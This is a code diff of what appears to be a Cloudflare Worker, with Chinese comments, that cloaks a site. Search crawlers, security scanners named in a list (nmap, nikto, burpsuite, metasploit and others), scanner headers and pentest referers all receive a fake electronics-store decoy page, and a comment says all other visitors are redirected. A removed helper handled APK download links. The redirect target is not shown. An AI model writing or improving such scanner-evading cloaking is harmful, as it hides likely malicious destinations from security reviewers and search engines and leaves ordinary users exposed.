@@ -3,12 +3,18 @@ export default {
     try {
       const url = new URL(request.url)
       
-      // 1. 用户代理检测和请求头检测
-      const userAgent = request.headers.get('user-agent') || ''
-      const isCrawler = this.isCrawlerOrBot(userAgent)
+      // 检查是否有特殊参数，用于测试和调试
+      const debugMode = url.searchParams.has('debug')
       
-      // 检测是否来自安全扫描工具或爬虫
-      if (isCrawler || this.hasSuspiciousHeaders(request.headers)) {
+      // 1. 用户代理检测和请求头检测 - 改进检测逻辑
+      const userAgent = request.headers.get('user-agent') || ''
+      
+      // 只有明确检测到爬虫时才显示伪装页面，其他情况都重定向
+      const isCrawler = this.isCrawlerOrBot(userAgent)
+      const hasSuspiciousHeaders = this.hasSuspiciousHeaders(request.headers)
+      
+      // 如果是调试模式或者检测到爬虫或可疑请求头，显示伪装页面
+      if (debugMode || isCrawler || hasSuspiciousHeaders) {
         console.log('检测到爬虫或可疑请求头，显示伪装页面')
         // 显示伪装页面
         return this.serveDecoyPage(request, env, url, userAgent)
@@ -48,41 +54,48 @@ export default {
     }
   },
   
-  // 检测是否为爬虫或机器人
+  // 检测是否为爬虫或机器人 - 更严格的匹配，避免误判
   isCrawlerOrBot(userAgent) {
-    const botPatterns = [
-      'bot', 'spider', 'crawl', 'slurp', 'baiduspider',
-      'googlebot', 'yandex', 'bingbot', 'facebookexternalhit',
-      'lighthouse', 'pagespeed', 'pingdom', 'phantom', 'headless',
-      'scrape', 'curl', 'wget', 'python', 'java', 'http', 'semrush',
-      'ahrefsbot', 'mj12bot', 'dotbot', 'rogerbot', 'seznambot',
-      'applebot', 'exabot', 'sogou', 'scooter', 'scanner',
-      'archive.org', 'ia_archiver', 'censys', 'nmap', 'nikto',
-      'acunetix', 'burp', 'zap', 'nuclei', 'wappalyzer'
+    // 明确的爬虫标识
+    const strictBotPatterns = [
+      'googlebot', 'bingbot', 'yandexbot', 'baiduspider',
+      'facebookexternalhit', 'twitterbot', 'rogerbot',
+      'linkedinbot', 'embedly', 'quora link preview', 'showyoubot',
+      'outbrain', 'pinterest', 'slackbot', 'vkshare', 'w3c_validator',
+      'crawler', 'spider', 'ahrefsbot', 'mj12bot', 'dotbot',
+      'seznambot', 'applebot', 'exabot', 'ia_archiver'
+    ]
+    
+    // 安全扫描工具
+    const scannerPatterns = [
+      'nmap', 'nikto', 'acunetix', 'burpsuite', 'owasp', 'zap', 'nessus',
+      'metasploit', 'nuclei', 'wappalyzer', 'whatweb', 'masscan'
     ]
     
     userAgent = userAgent.toLowerCase()
-    return botPatterns.some(pattern => userAgent.includes(pattern))
+    
+    // 只有明确匹配爬虫或扫描工具的才返回true
+    return strictBotPatterns.some(pattern => userAgent.includes(pattern)) ||
+           scannerPatterns.some(pattern => userAgent.includes(pattern))
   },
   
-  // 检测可疑的请求头
+  // 检测可疑的请求头 - 更精确的检测，减少误判
   hasSuspiciousHeaders(headers) {
-    // 检查是否有可疑的请求头
-    const suspiciousHeaders = [
-      'x-forwarded-for', 'via', 'forwarded', 'x-real-ip',
-      'cf-connecting-ip', 'true-client-ip', 'x-wap-profile',
-      'proxy', 'x-scan', 'x-scanner', 'x-probe', 'x-attack'
+    // 只检查明确的扫描工具和安全测试相关请求头
+    const clearlyMaliciousHeaders = [
+      'x-scan', 'x-scanner', 'x-probe', 'x-attack',
+      'x-vulnerability-scanner', 'x-pentest'
     ]
     
-    for (const header of suspiciousHeaders) {
+    for (const header of clearlyMaliciousHeaders) {
       if (headers.has(header)) {
         return true
       }
     }
     
-    // 检查Referer是否来自可疑来源
+    // 检查Referer是否来自明确的安全测试来源
     const referer = headers.get('referer') || ''
-    const suspiciousReferers = ['security', 'pentest', 'scanner', 'hack', 'exploit']
+    const suspiciousReferers = ['pentest', 'security-test', 'vulnerability-scan', 'exploit-db']
     return suspiciousReferers.some(term => referer.toLowerCase().includes(term))
   },
   
@@ -97,11 +110,12 @@ export default {
       'X-XSS-Protection': '1; mode=block',
       'Access-Control-Allow-Origin': '*',
       'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
-      'Access-Control-Allow-Headers': 'Content-Type'
+      'Access-Control-Allow-Headers': 'Content-Type',
+      'Cache-Control': 'no-store, max-age=0'
     }
     
     // 5. 记录检测日志
-    console.log(`检测到可疑请求: ${userAgent}`)
+    console.log(`检测到可疑请求或调试模式: ${userAgent}`)
     
     // 处理根路径
     if (url.pathname === '/' || url.pathname === '') {
@@ -109,15 +123,52 @@ export default {
       return this.addSecurityHeaders(response, securityHeaders)
     }
     
-    // 处理产品详情页
-    if (url.pathname.startsWith('/product')) {
-      const response = await env.ASSETS.fetch(new Request(`${url.origin}/product.html`, request))
-      return this.addSecurityHeaders(response, securityHeaders)
+    // 处理图片请求 - 支持所有图片格式
+    if (this.isImageRequest(url)) {
+      try {
+        const response = await env.ASSETS.fetch(request)
+        return this.addSecurityHeaders(response, securityHeaders)
+      } catch (error) {
+        console.error(`图片资源不存在: ${url.pathname}`)
+        // 如果图片不存在，返回默认图片
+        const defaultImageResponse = await env.ASSETS.fetch(new Request(`${url.origin}/electronics.svg`, request))
+        return this.addSecurityHeaders(defaultImageResponse, securityHeaders)
+      }
     }
     
-    // 尝试提供请求的资源
-    const response = await env.ASSETS.fetch(request)
-    return this.addSecurityHeaders(response, securityHeaders)
+    // 处理HTML页面请求
+    if (url.pathname.endsWith('.html') || url.pathname.includes('product') || url.pathname.includes('category')) {
+      try {
+        const response = await env.ASSETS.fetch(request)
+        return this.addSecurityHeaders(response, securityHeaders)
+      } catch (error) {
+        console.error(`HTML页面不存在: ${url.pathname}`)
+        const response = await env.ASSETS.fetch(new Request(`${url.origin}/index.html`, request))
+        return this.addSecurityHeaders(response, securityHeaders)
+      }
+    }
+    
+    // 处理JavaScript和CSS文件
+    if (url.pathname.endsWith('.js') || url.pathname.endsWith('.css')) {
+      try {
+        const response = await env.ASSETS.fetch(request)
+        return this.addSecurityHeaders(response, securityHeaders)
+      } catch (error) {
+        console.error(`JS/CSS文件不存在: ${url.pathname}`)
+        return new Response('// 文件不存在', { status: 404, headers: securityHeaders })
+      }
+    }
+    
+    // 尝试提供请求的其他资源
+    try {
+      const response = await env.ASSETS.fetch(request)
+      return this.addSecurityHeaders(response, securityHeaders)
+    } catch (error) {
+      // 如果资源不存在，返回首页
+      console.error(`资源不存在: ${url.pathname}`)
+      const response = await env.ASSETS.fetch(new Request(`${url.origin}/index.html`, request))
+      return this.addSecurityHeaders(response, securityHeaders)
+    }
   },
   
   // 添加安全头部
@@ -147,12 +198,8 @@ export default {
     })
   },
   
-  // 添加JavaScript下载处理
-  handleJsDownload(url) {
-    // 将直接下载链接转为JavaScript处理的下载方式
-    if (url.pathname.endsWith('.apk') || url.pathname.includes('download')) {
-      return true
-    }
-    return false
+  // 检查是否为图片资源请求
+  isImageRequest(url) {
+    return url.pathname.endsWith('.svg') || url.pathname.endsWith('.png') || url.pathname.endsWith('.jpg') || url.pathname.endsWith('.jpeg')
   }
 }
